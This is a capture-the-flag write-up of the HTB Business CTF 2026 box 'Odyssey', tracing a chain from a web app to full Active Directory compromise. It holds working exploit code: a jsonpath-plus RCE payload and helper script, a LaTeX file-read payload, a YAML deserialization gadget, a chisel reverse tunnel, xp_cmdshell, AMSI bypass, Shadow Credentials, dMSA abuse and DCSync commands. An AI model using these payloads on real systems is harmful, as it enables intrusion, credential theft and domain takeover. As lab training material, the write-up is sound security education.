---
title: Fullpwn - Odyssey - HTB Business CTF 2026 Project Nightfall
date: "2026-05-20"
excerpt: Writeup of the box Odyssey from HTB business CTF 2026
tags:
  - fullpwn
  - mssql
  - dpapi
  - deserialization
  - web
author: Ap4sh
---

## Overview

Odyssey was an insane fullpwn box from HTB business CTF 2026.

The public surface was only a Node/Express web app on port `3000`, but the box slowly unfolded into a full internal Windows domain, TL;DR:

- WebAuthn logic bug -> admin session
- LaTeX render file read -> diagnostic token leak
- `jsonpath-plus` RCE -> `webadmin`
- password reuse / Linux privesc -> `root` on `odyssey-web`
- MSSQL UNC coercion -> `svc-mssql`
- MSSQL `xp_cmdshell` + GodPotato -> `SYSTEM` on `ODYSSEY-DB`
- AD dump -> Shadow Credentials -> BadSuccessor/dMSA -> `svc-aegis-deploy`
- reverse AegisStream -> Operator key -> YAML deserialization RCE
- `svc-aegis-stream` DCSync rights -> domain compromise -> `root.txt`

Fun part is that the challenge keeps changing style: classic web bug, then Linux pivoting, then SQL/NTLM, then modern Windows Server 2025 dMSA abuse, and finally a custom .NET named pipe service. A LOT of things, and a very, very long insane box.

---

## 1. Recon

The machine exposed only the AEGIS web service:

```bash
nmap -Pn -T5 10.129.1.90

PORT     STATE SERVICE
3000/tcp open  ppp
```

The vhost was:

```text
http://aegis.korvia.htb:3000/login
```

The page was an AEGIS signing/attestation portal using WebAuthn/FIDO2 login. The challenge hint mentioned:

```text
2026-04-28 - Roster revision Delta-2 -> Delta-3 effective immediately for Operator i.demko.
```

So the first goal was to understand the identity model and find a way into the app as a real operator.

---

## 2. Getting an Operator Account

The unauthenticated MDS search endpoint had an interesting `pipeline` parameter. MongoDB aggregation was partially filtered, but nested stages inside `$facet` still worked, which let us query internal collections from the same database.

The important collection was `pending_invites`, leaked through nested `$unionWith`. It contained valid onboarding tokens.

With one token, we used a real browser + virtual WebAuthn authenticator to register a credential and log in as a normal operator.

```python
from playwright.sync_api import sync_playwright

BASE = "http://aegis.korvia.htb:3000"
TOKEN = "<valid pending invite token>"

with sync_playwright() as p:
    browser = p.chromium.launch(
        headless=False,
        args=[f"--unsafely-treat-insecure-origin-as-secure={BASE}"],
    )
    context = browser.new_context()
    page = context.new_page()

    cdp = context.new_cdp_session(page)
    cdp.send("WebAuthn.enable")
    cdp.send("WebAuthn.addVirtualAuthenticator", {
        "options": {
            "protocol": "ctap2",
            "transport": "usb",
            "hasResidentKey": True,
            "hasUserVerification": True,
            "isUserVerified": True,
            "automaticPresenceSimulation": True,
        }
    })

    page.goto(f"{BASE}/onboard/{TOKEN}", wait_until="networkidle")
    page.click("#js-attest")
    page.goto(f"{BASE}/login", wait_until="networkidle")
    page.click("#js-auth-btn")
    page.wait_for_url("**/dashboard")
```

This gave us a legit low-privileged session, which was enough to study the WebAuthn flow properly.

---

## 3. WebAuthn UserHandle Confusion

The login flow had the real bug: during `/api/v1/auth/webauthn/auth/finish`, the server verified the assertion against our credential, but then trusted the `response.userHandle` value to decide which operator the session belonged to.

So we registered our own resident credential, authenticated with it, intercepted the finish request, and swapped:

```text
response.userHandle = base64url("admin")
```

The signature still verified because the credential was ours, but the resulting session became:

```json
{
  "ok": true,
  "handle": "admin",
  "display_name": "System Administrator",
  "role": "Administrator",
  "clearance": "Delta-5"
}
```

That unlocked `/admin/approvals`, `/admin/operators`, and `/admin/templates`.

---

## 4. Admin Templates -> LaTeX File Read

The admin template renderer was the next door. The app rendered user-controlled template bodies through this pipeline:

```text
nunjucks -> pandoc -> pdflatex -> latex -> dvips -> gs
```

Raw LaTeX was accepted. We abused `\openin` and `\typeout` to dump local files into the render error output:

```tex
\newread\f
\def\filepath{/etc/passwd}
\openin\f=\filepath
\loop\unless\ifeof\f
  \read\f to \myl
  \typeout{LEAK:\meaning\myl}
\repeat
\errmessage{LEAK_DONE}
```

This confirmed the web box users and showed that the app was running from:

```text
/home/webadmin/aegis
```

Then we leaked the systemd unit:

```text
/etc/systemd/system/aegis.service
```

which pointed to an environment file:

```text
/etc/aegis-mds-diag.env
```

That file contained the diagnostic token for the MDS debug endpoint.

---

## 5. JSONPath RCE as webadmin

The diagnostic endpoint was:

```text
/api/v1/aegis-mds/_diag/<token>/jpquery
```

Source leakage showed it used:

```text
jsonpath-plus@10.2.0
```

That version is vulnerable to CVE-2025-1302. A crafted filter expression can break out of the library's "safe" evaluation context and reach Node's `child_process`.

The core payload shape was:

```js
$..[?(p="this.process.mainModule.require('child_process').execSync('id')";a=''[['constructor']][['constructor']](p);a())]
```

I wrapped it in a small helper:

```python
import json
import requests

BASE = "http://aegis.korvia.htb:3000"
TOKEN = "<MDS_DIAG_TOKEN>"

cmd = "id > /home/webadmin/aegis/public/p.txt 2>&1"
code = (
    "this.process.mainModule.require('child_process')"
    f".execSync({json.dumps(cmd)});"
    "return false"
)
expr = "$..[?(p=" + json.dumps(code) + ";a=''[['constructor']][['constructor']](p);a())]"

r = requests.post(
    f"{BASE}/api/v1/aegis-mds/_diag/{TOKEN}/jpquery",
    json={"expr": expr},
)
print(r.status_code, r.text[:200])
print(requests.get(f"{BASE}/p.txt").text)
```


`uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),27(sudo),983(aegis-render)`

So we had RCE as `webadmin` on `odyssey-web`

---

## 6. Linux root on odyssey-web

From the web source we recovered the MSSQL application credential:

```text
odyssey_app : opc0932k90%%lODFI93-++
```

That same password was reused for the Linux `root` account on `odyssey-web`.


`su root`


`uid=0(root) gid=0(root) groups=0(root)`


We also validated a kernel route with CopyFail (CVE-2026-31431), but the intended clean path was just password reuse from `odyssey_app` to Linux `root`.

Root on the Linux web box mattered mostly because it made the internal pivot and SMB coercion reliable: binding/forwarding privileged ports, changing firewall rules, and exposing port `445` cleanly to the internal Windows hosts.

(a lil extra thing here; during the ctf we used copy.fail to get root on the env before realizing we could've just reused the password)

---

## 7. Internal Pivot

The web host had an internal interface:

```text
172.16.0.12/24
```

Internal hostnames pointed to:

```text
172.16.0.10  dc01.odyssey.htb
172.16.0.11  odyssey-db.odyssey.htb
```

I used chisel to forward the DC ports back to my box:

```bash
./chisel server --host 0.0.0.0 -p 9002 --reverse
```

On `odyssey-web`:

```bash
/tmp/chisel client 10.10.14.155:9002 \
  R:127.0.0.1:53:172.16.0.10:53 \
  R:127.0.0.1:88:172.16.0.10:88 \
  R:127.0.0.1:389:172.16.0.10:389 \
  R:127.0.0.1:445:172.16.0.10:445 \
  R:127.0.0.1:464:172.16.0.10:464 \
  R:127.0.0.1:636:172.16.0.10:636 \
  R:127.0.0.1:5985:172.16.0.10:5985 \
  R:127.0.0.1:9389:172.16.0.10:9389
```

Now all AD tooling could talk to `127.0.0.1` as if it was the DC.

---

## 8. MSSQL UNC Coercion -> svc-mssql

The app SQL credential worked against MSSQL on `172.16.0.11`, but it was not sysadmin. The second DB credential, leaked through the render environment, was:

```text
aegis_audit_publisher : Rxd!Qw6n8sP..2bJ@Wpx-2026
```

That account owned `aegis_audit`, which made this possible:

```sql
BACKUP DATABASE aegis_audit
TO DISK='\\172.16.0.12\share\aegis_audit.bak'
WITH INIT, COPY_ONLY;
```

Because `172.16.0.12` was our controlled Linux web host, MSSQL tried to authenticate over SMB. As root on `odyssey-web`, we allowed the DB host to hit port `445`:

```bash
iptables -I INPUT 1 -p tcp -s 172.16.0.11 --dport 445 -j ACCEPT
```

Then we captured the NetNTLMv2 for:

```text
ODYSSEY\svc-mssql
```

The captured hash cracked to:

```text
svc-mssql : cml958782
```

That password was valid for LDAP and for Windows-auth MSSQL.

---

## 9. MSSQL xp_cmdshell -> SYSTEM on ODYSSEY-DB

With Windows authentication as `svc-mssql`, MSSQL gave enough rights to enable and use `xp_cmdshell`:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami /all';
```

The process ran as:

```text
odyssey\svc-mssql
```

and had the good privileges:

```text
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
```

Defender blocked stock potato binaries, so I used a small neutral .NET loader that:

1. XOR-decrypted the real payload on disk
2. patched `AmsiScanBuffer`
3. loaded the assembly in memory

Then GodPotato worked from `xp_cmdshell`:

```bash
python3 mssql_xpcmd.py 'C:\ProgramData\nl.exe C:\ProgramData\gdiag.xor PipeKey2026 -cmd "whoami"'
```

Proof:

```text
nt authority\system
```

From `SYSTEM` on `ODYSSEY-DB`, the first flag was on the Administrator desktop:

```text
C:\Users\Administrator\Desktop\user.txt
```

---

## 10. Dumping DB Secrets

As `SYSTEM` on `ODYSSEY-DB`, we dumped local secrets and got the DB machine account hash:

```text
ODYSSEY-DB$ : 71bc6be8565f0c9871070c3912b1680d
```

This was the key to the AD part.

BloodHound showed that `ODYSSEY-DB$` could abuse Shadow Credentials against:

```text
svc-aegis-build
```

Using Certipy:

```bash
certipy shadow add \
  -u 'ODYSSEY-DB$@odyssey.htb' \
  -hashes ':71bc6be8565f0c9871070c3912b1680d' \
  -account svc-aegis-build \
  -dc-ip 127.0.0.1 \
  -target dc01.odyssey.htb \
  -scheme ldaps \
  -out svc-aegis-build-shadow

certipy auth \
  -pfx svc-aegis-build-shadow.pfx \
  -username svc-aegis-build \
  -domain odyssey.htb \
  -dc-ip 127.0.0.1
```

That recovered:

```text
svc-aegis-build NT hash:
bbc270509ec878cf516d5295fb4d774d
```

---

## 11. BadSuccessor / dMSA -> svc-aegis-deploy

`svc-aegis-build` was a member of:

```text
PipelineMigrationOps
```

That group could create delegated managed service accounts in:

```text
OU=Migrations,DC=odyssey,DC=htb
```

This is exactly the kind of setup where BadSuccessor becomes a clean privilege escalation primitive.

We created a dMSA object and linked it to the target service account:

```text
CN=aegisd5,OU=Migrations,DC=odyssey,DC=htb
```

Important attributes on the dMSA:

```text
msDS-ManagedAccountPrecededByLink = CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb
msDS-DelegatedMSAState = 2
```

Important attributes on `svc-aegis-deploy`:

```text
msDS-SupersededManagedAccountLink = CN=aegisd5,OU=Migrations,DC=odyssey,DC=htb
msDS-SupersededServiceAccountState = 2
```

After that, `badS4U2self` gave the previous key for the superseded account:

```text
svc-aegis-deploy NT hash:
3a5026b2aa5ef2cbb7cb6a7be3a2bcfa
```

Verification:

```bash
nxc ldap 127.0.0.1 -d ODYSSEY.HTB -u svc-aegis-deploy -H 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa
nxc winrm 127.0.0.1 -d ODYSSEY.HTB -u svc-aegis-deploy -H 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa
```


`[+] ODYSSEY.HTB\svc-aegis-deploy:3a5026b2aa5ef2cbb7cb6a7be3a2bcfa`

`[+] ... (Pwn3d!)`


It was not local admin on the DC, but it had WinRM and access to the custom AegisStream service files.

---

## 12. AegisStream Recon

On the DC, `svc-aegis-deploy` could read:

```text
C:\ProgramData\AegisStream
```

Interesting files:

```text
viewer.key
operator.key.enc
operator.wrap.bin
current.bin
current-2026-Q1.bin
AegisStreamSvc.dll
AegisStream.Common.dll
AegisStreamWatchdog.dll
```

The viewer key was a raw HMAC key:

```text
6204420823d72023c616d14bc0a5dfa35f549788b1ed8a970b92cf1991ac8fa6
```

Reversing the DLLs showed that the service was not HTTP. It used a local named pipe:

```text
\\.\pipe\AegisStreamMgmt
```

Frame format:

```text
uint32 magic      = 0xa3915eab
uint32 request_id
uint16 opcode_len
bytes  opcode
uint32 payload_len
bytes  payload
bytes  hmac_sha256(opcode || payload)
```

The HMAC key decides the role:

```text
Viewer   = 10
Auditor  = 20
Operator = 30
```

I wrote a tiny PowerShell pipe client to talk to it through WinRM:

```powershell
$pipe = [IO.Pipes.NamedPipeClientStream]::new(".", "AegisStreamMgmt", [IO.Pipes.PipeDirection]::InOut)
$pipe.Connect(5000)
# build frame, sign HMAC(opcode || payload), send, parse reply
```

Testing `STREAM_LIST` with `viewer.key` returned `Status: OK`, so the protocol and signing were correct.

---

## 13. Viewer -> Operator Key

The big bug was in this operation:

```text
DIAG_DECRYPT_TELEMETRY_BLOB
```

It required only Viewer role, but it called:

```csharp
ProtectedData.Unprotect(frame.Payload, null, DataProtectionScope.CurrentUser)
```

inside the AegisStream service context.

So we sent `operator.wrap.bin` to that operation and got the DPAPI-unwrapped key:

```text
d5742ed26151833792ffd2d821959e0f1b85a1f922157639a6c7ec90c094d658
```

Then `operator.key.enc` was AES-GCM:

```text
nonce(12) || tag(16) || ciphertext(32)
```

Decrypting it gave the Operator HMAC key:

```text
4b690afb33fd7f1bd2c4b36fce121b8b291352a5a0ed8632a0654422f401a83c
```

At this point we could sign Operator-only AegisStream management frames.

---

## 14. CONFIG_IMPORT YAML Deserialization RCE

The Operator-only `CONFIG_IMPORT` handler was unsafe:

```csharp
new DeserializerBuilder()
    .WithNodeTypeResolver(new TypeNameInTagNodeTypeResolver())
    .Build()
    .Deserialize<object>(reader);
```

Because `TypeNameInTagNodeTypeResolver` was enabled, YAML tags could instantiate .NET types. The standard `ObjectDataProvider` gadget worked:

```yaml
!System.Windows.Data.ObjectDataProvider,PresentationFramework
MethodName: Start
ObjectInstance: !System.Diagnostics.Process,System.Diagnostics.Process
  StartInfo: !System.Diagnostics.ProcessStartInfo,System.Diagnostics.Process
    FileName: cmd.exe
    Arguments: /C whoami > C:\ProgramData\AegisStream\logs\whoami.txt
```

Proof:

```text
odyssey\svc-aegis-stream
```

So now we had command execution as the service account running the AegisStream service.

---

## 15. svc-aegis-stream -> DCSync

BloodHound showed that `svc-aegis-stream` had replication rights on the domain:

```text
DS-Replication-Get-Changes
DS-Replication-Get-Changes-All
```

That is DCSync.

The service already had a TGT in its current logon session. Through the AegisStream RCE, we dropped a Rubeus loader and ran:

```powershell
Rubeus.exe triage /nowrap
Rubeus.exe tgtdeleg /nowrap
```

`tgtdeleg` returned a base64 `.kirbi` for:

```text
svc-aegis-stream @ ODYSSEY.HTB
```

Convert it and DCSync from Linux:

```bash
ticketConverter.py svc-aegis-stream.kirbi svc-aegis-stream.ccache

KRB5CCNAME=svc-aegis-stream.ccache secretsdump.py \
  -k -no-pass \
  -dc-ip 127.0.0.1 \
  ODYSSEY.HTB/svc-aegis-stream@dc01.odyssey.htb
```

After dumping the domain secrets, use the Administrator NT hash:

```bash
nxc winrm 127.0.0.1 \
  -d ODYSSEY.HTB \
  -u Administrator \
  -H '<administrator_nt_hash>' \
  -X 'type C:\Users\Administrator\Desktop\root.txt'
```

That reads the final flag from the DC Administrator desktop.

```text
root.txt: <redacted>
```

---

## 16. Final Chain

Short version:

```text
MDS pipeline leak -> pending invite
pending invite -> valid WebAuthn credential
WebAuthn userHandle swap -> admin
admin template render -> LaTeX file read
file read -> MDS diagnostic token
jsonpath-plus CVE-2025-1302 -> RCE as webadmin
web source -> odyssey_app SQL password
password reuse -> root on odyssey-web
root web pivot + MSSQL BACKUP UNC -> NetNTLMv2 for svc-mssql
svc-mssql -> Windows-auth MSSQL -> xp_cmdshell
SeImpersonate + GodPotato -> SYSTEM on ODYSSEY-DB
SYSTEM dump -> ODYSSEY-DB$ hash
ODYSSEY-DB$ ShadowCred -> svc-aegis-build
svc-aegis-build BadSuccessor/dMSA -> svc-aegis-deploy
svc-aegis-deploy -> read AegisStream files on DC
viewer key -> DPAPI unwrap operator key
operator key -> CONFIG_IMPORT YAML deserialization
RCE as svc-aegis-stream -> DCSync -> Administrator -> root.txt
```

---

## 17. Useful Minimal Helpers

### JSONPath RCE helper

```python
import json
import sys
import time
import requests

base = sys.argv[1].rstrip("/")
token = sys.argv[2]
cmd = " ".join(sys.argv[3:])
out = "/home/webadmin/aegis/public/p.txt"

shell = f"/bin/bash -lc {json.dumps(cmd + ' > ' + out + ' 2>&1')}"
code = (
    "this.process.mainModule.require('child_process')"
    f".execSync({json.dumps(shell)});"
    "return false"
)
expr = "$..[?(p=" + json.dumps(code) + ";a=''[['constructor']][['constructor']](p);a())]"

requests.post(f"{base}/api/v1/aegis-mds/_diag/{token}/jpquery", json={"expr": expr}, timeout=5)
time.sleep(1)
print(requests.get(f"{base}/p.txt", timeout=5).text)
```


`python3 rce_jsonpath_min.py http://aegis.korvia.htb:3000 '<diag_token>' 'id'`


### MSSQL xp_cmdshell helper

```python
#!/usr/bin/env python3
import os
import subprocess
import sys
import tempfile

target = "ODYSSEY/svc-mssql:cml958782@172.16.0.11"
command = " ".join(sys.argv[1:]).replace("'", "''")
sql = "EXEC xp_cmdshell '{}';\n".format(command)

fd, path = tempfile.mkstemp(suffix=".sql")
os.write(fd, sql.encode())
os.close(fd)

print(subprocess.check_output([
    "proxychains4", "-q", "-f", "proxychains-odyssey.conf",
    "mssqlclient.py", "-windows-auth", "-db", "master", target, "-file", path,
], stderr=subprocess.STDOUT, text=True))

os.unlink(path)
```


`python3 mssql_xpcmd_min.py whoami /all`


### AegisStream CONFIG_IMPORT RCE helper

This assumes the PowerShell named pipe client is already uploaded to `C:\Windows\Temp\aegis_pipe_client.ps1`, and that the DC WinRM port is forwarded locally.

```python
#!/usr/bin/env python3
import base64
import subprocess
import sys

opkey = "4b690afb33fd7f1bd2c4b36fce121b8b291352a5a0ed8632a0654422f401a83c"
deploy_hash = "3a5026b2aa5ef2cbb7cb6a7be3a2bcfa"
pipe_client = r"C:\Windows\Temp\aegis_pipe_client.ps1"
command = " ".join(sys.argv[1:])

yaml = f"""!System.Windows.Data.ObjectDataProvider,PresentationFramework
MethodName: Start
ObjectInstance: !System.Diagnostics.Process,System.Diagnostics.Process
  StartInfo: !System.Diagnostics.ProcessStartInfo,System.Diagnostics.Process
    FileName: cmd.exe
    Arguments: /C {command}
"""

payload = base64.b64encode(yaml.encode()).decode()
ps = f"powershell -ExecutionPolicy Bypass -File {pipe_client} -Op CONFIG_IMPORT -KeyHex {opkey} -PayloadB64 {payload}"

print(subprocess.check_output([
    "nxc", "winrm", "127.0.0.1",
    "-d", "ODYSSEY.HTB",
    "-u", "svc-aegis-deploy",
    "-H", deploy_hash,
    "-X", ps,
], stderr=subprocess.STDOUT, text=True))
```


`python3 aegis_stream_rce_min.py 'whoami > C:\ProgramData\AegisStream\logs\whoami.txt'`


### Reading the final flag

Once the Administrator hash is recovered through DCSync, we can now read the last flag :-)

```bash
nxc winrm 127.0.0.1 -d ODYSSEY.HTB -u Administrator -H '<administrator_nt_hash>' \
  -X 'type C:\Users\Administrator\Desktop\root.txt'
```

---

Much love 💋

Ap4sh
